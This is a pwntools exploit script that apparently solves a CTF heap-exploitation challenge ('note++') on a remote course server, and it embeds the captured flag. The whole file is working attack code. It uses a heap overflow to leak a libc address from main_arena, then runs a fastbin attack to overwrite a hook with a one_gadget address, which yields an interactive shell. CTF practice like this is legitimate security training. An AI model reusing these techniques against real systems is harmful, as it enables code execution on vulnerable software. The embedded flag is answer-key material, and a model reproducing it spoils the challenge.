#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
"""
    FLAG{Heap_exp1oit4ti0n_15_fun}
"""
r = remote('edu-ctf.csie.org',10181)
#r = process('./note++')
libc = ELF('./libc-2.23.so')

def cmd(x):
    r.recvuntil('>')
    r.sendline(str(x))

def add(s,n,d):
    cmd(1)
    r.recvuntil('Size: ')
    r.sendline(str(int(s)))
    r.recvuntil('Note: ')
    r.send(n)
    r.recvuntil('note: ')
    r.sendline(d)

def show():
    cmd(2)

def delete(i):
    cmd(3)
    r.recvuntil('Index: ')
    r.sendline(str(i))

add(24,'a'*8,'a'*8)  #0
add(0x48,'a'*8,'a'*8)#1
add(0x48,'a'*8,'a'*8)#2
add(0x48,'a'*8,'a'*8)#3

delete(0) 

add(0,'a'*24 + '\xa1','a'*8) #0
delete(1) # del #1 #2

add(0x48,'a'*8,'a'*8) #1 
show() 

r.recvuntil('Note 2:') #2
r.recvuntil('  Data: ')
main_arena = u64(r.recvline()[:-1].ljust(8,'\x00')) - 0x58
libc_base = main_arena + 0x58 - 0x3c4b78
one_gadget = libc_base + 0xf02a4
print '[*] main_arena : ',hex(main_arena)
print '[*] libc_base  : ',hex(libc_base)


add(0x48,'a'*8,'a'*8) #4=2


# fastbin-attack #

add(24,'a'*8,'a'*8)  #5
add(0x60,'a'*8,'a'*8)#6
add(0x60,'a'*8,'a'*8)#7

delete(5)
delete(6)
add(0,'a'*24 + '\x71' + '\x00'*7 + p64(main_arena - 0x20 + 5 - 0x18) ,'a'*8) #0

add(0x60,'a'*8,'a'*8)

add(0x60,'a'*19 + p64(one_gadget)*2,'a'*8)

delete(2) # show your hacker spirit!!
delete(4) 

r.interactive()
